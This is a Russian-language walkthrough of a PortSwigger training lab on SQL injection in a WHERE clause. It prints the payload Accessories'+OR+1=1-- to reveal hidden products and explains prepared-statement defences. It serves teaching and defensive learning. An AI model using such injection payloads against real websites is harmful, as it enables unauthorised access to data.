# 📘 PortSwigger Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

<a id="top"></a>

> 🔗 Лаба:
> https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

---

# 📑 Оглавление

- [🎯 Цель](#goal)
- [🧠 Что такое SQL Injection](#idea)
- [🏗 Как работает уязвимость](#how)
- [🔍 Шаг 1 — Анализ URL](#step1)
- [🔍 Шаг 2 — Анализ SQL-запроса](#step2)
- [🔍 Шаг 3 — Поиск точки инъекции](#step3)
- [🔍 Шаг 4 — Проверка комментариев SQL](#step4)
- [🔍 Шаг 5 — Построение payload](#step5)
- [🔍 Шаг 6 — Получение скрытых товаров](#step6)
- [💥 Почему атака сработала](#why)
- [🛡 Как защититься](#defense)
- [🛠 Чеклист исследователя](#checklist)

---

<a id="goal"></a>

# 🎯 Цель

Получить доступ к скрытым (unreleased) товарам через SQL Injection в параметре category.

---

<a id="idea"></a>

# 🧠 Что такое SQL Injection

SQL Injection появляется, когда приложение:

- принимает ввод пользователя;
- вставляет его прямо в SQL-запрос;
- не фильтрует специальные символы.

---

# Пример безопасного запроса

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

---

# Что опасно

Если пользователь может изменить часть SQL,
он может:

- читать скрытые данные;
- обходить ограничения;
- изменять логику запросов.

---

<a id="how"></a>

# 🏗 Как работает уязвимость

Приложение использует запрос:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

---

# Что делает released = 1

Это условие показывает только опубликованные товары.

Скорее всего:

```text
released = 1 -> опубликован
released = 0 -> скрыт
```

---

# Наша задача

Нужно убрать проверку:

```sql
AND released = 1
```

---

<a id="step1"></a>

# 🔍 Шаг 1 — Анализ URL

Открываем категорию товаров.

Например:

```http
/filter?category=Accessories
```

---

# Что важно понять

Параметр:

```text
category=Accessories
```

попадает в SQL-запрос.

---

# Backend примерно делает так

```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

---

<a id="step2"></a>

# 🔍 Шаг 2 — Анализ SQL-запроса

Разберем запрос:

```sql
SELECT * FROM products
```

означает:

> выбрать все товары.

---

```sql
WHERE category = 'Accessories'
```

означает:

> показать только Accessories.

---

```sql
AND released = 1
```

означает:

> только опубликованные товары.

---

# Где уязвимость

Пользователь контролирует:

```sql
'Accessories'
```

---

<a id="step3"></a>

# 🔍 Шаг 3 — Поиск точки инъекции

Отправляем запрос в Burp Repeater.

---

# Пробуем символ '

```http
GET /filter?category=Accessories'
```

---

# Что может произойти

- ошибка SQL;
- изменение ответа;
- нестандартное поведение.

---

# Почему это важно

Одинарная кавычка:

```sql
'
```

используется в SQL для строк.

Если запрос ломается —
значит наш ввод влияет на SQL.

---

<a id="step4"></a>

# 🔍 Шаг 4 — Проверка комментариев SQL

В SQL существуют комментарии.

Например:

```sql
--
```

---

# Что делает --

Все после него игнорируется.

---

# Пример

```sql
SELECT * FROM users -- comment
```

SQL выполнит только:

```sql
SELECT * FROM users
```

---

# Почему это важно

Мы можем “обрезать” остаток запроса.

---

<a id="step5"></a>

# 🔍 Шаг 5 — Построение payload

Используем payload:

```http
/filter?category=Accessories'+OR+1=1--
```

---

# Что такое +

В URL:

```text
+ = пробел
```

---

# Payload становится

```sql
Accessories' OR 1=1--
```

---

# Как выглядит итоговый SQL

```sql
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

---

# Что здесь происходит

## 1. Закрываем строку

```sql
Accessories'
```

---

## 2. Добавляем условие

```sql
OR 1=1
```

---

# Почему это работает

```sql
1=1
```

всегда TRUE.

---

# Что делает OR

Если хотя бы одно условие TRUE —
весь WHERE становится TRUE.

---

## 3. Комментируем остаток

```sql
--
```

убирает:

```sql
AND released = 1
```

---

<a id="step6"></a>

# 🔍 Шаг 6 — Получение скрытых товаров

После отправки payload:

```http
/filter?category=Accessories'+OR+1=1--
```

приложение начинает показывать:

- опубликованные товары;
- скрытые товары;
- товары из других категорий.

---

# Что означает успешная атака

Лаба автоматически засчитывается.

---

<a id="why"></a>

# 💥 Почему атака сработала

Потому что приложение:

- доверяло вводу пользователя;
- не использовало prepared statements;
- вставляло данные напрямую в SQL.

---

# Главная проблема

Backend делал примерно так:

```php
$sql = "SELECT * FROM products WHERE category = '$category'";
```

Это небезопасно.

---

<a id="defense"></a>

# 🛡 Как защититься

## 1. Prepared Statements

Самая важная защита.

---

# Безопасный пример

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = ?");
```

---

## 2. Parameterized queries

Никогда не вставлять пользовательский ввод напрямую.

---

## 3. Input validation

Разрешать только ожидаемые значения.

Например:

```text
Accessories
Pets
Tech
```

---

## 4. Least privilege

SQL user не должен иметь лишних прав.

---

<a id="checklist"></a>

# 🛠 Чеклист исследователя

- [ ] найден параметр
- [ ] подтверждено влияние на SQL
- [ ] найдена SQL comment syntax
- [ ] проверен boolean condition
- [ ] получены скрытые данные
- [ ] подтверждена SQL Injection

---

# 🧠 Что должен запомнить пентестер

SQL Injection —
это не магия и не “волшебные payload”.

Это:
- контроль SQL-синтаксиса;
- изменение логики WHERE;
- понимание того, как backend строит запрос.

---

# ⬆ Наверх

[Вернуться к началу](#top)
